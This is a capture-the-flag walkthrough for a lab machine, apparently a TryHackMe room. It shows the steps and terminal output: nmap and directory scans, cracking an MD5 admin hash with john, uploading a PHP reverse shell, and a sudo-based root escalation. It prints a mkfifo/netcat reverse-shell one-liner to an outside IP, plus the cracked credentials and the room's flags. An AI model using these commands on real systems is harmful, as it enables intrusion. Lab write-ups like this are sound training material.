1. start with nmap scan. Checked relevant webpages. Observed no possible way from here. 
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -A -T4 10.10.230.196
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-18 05:22 EDT
Nmap scan report for 10.10.230.196
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 497cf741104373da2ce6389586f8e0f0 (RSA)
|   256 2fd7c44ce81b5a9044dfc0638c72ae55 (ECDSA)
|_  256 61846227c6c32917dd27459e29cb905e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=9/18%OT=22%CT=1%CU=38755%PV=Y%DS=2%DC=T%G=Y%TM=6508170
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11
OS:NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(
OS:R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   289.54 ms 10.8.0.1
2   289.73 ms 10.10.230.196

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.71 seconds

```

2. Start dirsearch and gobuster together. First search give /content subdirectory so started from there. 

a. Dirsearch - 
```
┌──(kali㉿kali)-[~]
└─$ python3 dirsearch/dirsearch.py -u http://10.10.230.196:80/content

  _|. _ _  _  _  _ _|_    v0.4.3                                            
 (_||| _) (/_(_|| (_| )                                                     
                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11713

Output: /home/kali/reports/http_10.10.230.196_80/_content_23-09-18_05-28-04.txt

Target: http://10.10.230.196/

[05:28:04] Starting: content/                                               
[05:28:09] 301 -  319B  - /content/js  ->  http://10.10.230.196/content/js/
[05:28:18] 403 -  278B  - /content/.ht_wsr.txt
[05:28:18] 403 -  278B  - /content/.htaccess.bak1
[05:28:18] 403 -  278B  - /content/.htaccess.orig
[05:28:18] 403 -  278B  - /content/.htaccess.sample
[05:28:18] 403 -  278B  - /content/.htaccess.save
[05:28:18] 403 -  278B  - /content/.htaccess_extra
[05:28:18] 403 -  278B  - /content/.htaccess_sc
[05:28:18] 403 -  278B  - /content/.htaccess_orig
[05:28:19] 403 -  278B  - /content/.htaccessOLD
[05:28:19] 403 -  278B  - /content/.htaccessBAK
[05:28:19] 403 -  278B  - /content/.htaccessOLD2
[05:28:19] 403 -  278B  - /content/.html
[05:28:19] 403 -  278B  - /content/.htm
[05:28:19] 403 -  278B  - /content/.httr-oauth
[05:28:19] 403 -  278B  - /content/.htpasswd_test
[05:28:19] 403 -  278B  - /content/.htpasswds
[05:28:23] 403 -  278B  - /content/.php
[05:28:23] 403 -  278B  - /content/.php3
[05:28:37] 200 -  964B  - /content/_themes/
[05:29:16] 200 -   18KB - /content/changelog.txt
[05:29:43] 301 -  323B  - /content/images  ->  http://10.10.230.196/content/images/
[05:29:43] 200 -    3KB - /content/images/
[05:29:44] 301 -  320B  - /content/inc  ->  http://10.10.230.196/content/inc/
[05:29:44] 200 -    7KB - /content/inc/
[05:29:48] 200 -    2KB - /content/js/
[05:29:51] 200 -   15KB - /content/license.txt

Task Completed                                                              
                
```

b. Gobuster
```
──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.230.196/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.230.196/content
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/09/18 05:29:07 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 323] [--> http://10.10.230.196/content/images/]                                                              
/js                   (Status: 301) [Size: 319] [--> http://10.10.230.196/content/js/]                                                                  
/inc                  (Status: 301) [Size: 320] [--> http://10.10.230.196/content/inc/]                                                                 
/as                   (Status: 301) [Size: 319] [--> http://10.10.230.196/content/as/]                                                                  
/_themes              (Status: 301) [Size: 324] [--> http://10.10.230.196/content/_themes/]                                                             
/attachment           (Status: 301) [Size: 327] [--> http://10.10.230.196/content/attachment/] 
```


3. Obtained admin user name and password hash. Cracked it. http://10.10.230.196/content/inc/mysql_backup/. i.e. manager:password123
```
┌──(kali㉿kali)-[~]
└─$ cat hash                                                      
42f749ade7f9e195bf475f37a44cafcb
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ hash-identifier                                               
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 42f749ade7f9e195bf475f37a44cafcb

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))


┌──(kali㉿kali)-[~]
└─$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123      (?)     
1g 0:00:00:00 DONE (2023-09-18 05:35) 50.00g/s 1680Kp/s 1680Kc/s 1680KC/s coco21..181193
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

4. After logging in upload pentest monky reverse shell on Data > Data Import section. Then, execute file from /content/inc/mysql_backup/ page. 

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.8.159.78] from (UNKNOWN) [10.10.230.196] 36792
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 12:46:53 up 26 min,  0 users,  load average: 0.00, 0.10, 0.49
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id

```

5. Obtained user flag on home directory. 

```
user.txt
$ cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
```

6. Check sudo files and use accordigly. 
```
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
$ cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f

```

7. Change copy.sh file and do sudo for escalation. Rooted. 
```
$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
$ echo "/bin/bash" > copy.sh
/bin/sh: 12: cannot create copy.sh: Permission denied
$ echo "/bin/bash" > /etc/copy.sh
$ cat /etc/copy.sh
/bin/bash

$ sudo /usr/bin/perl /home/itguy/backup.pl

cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}

```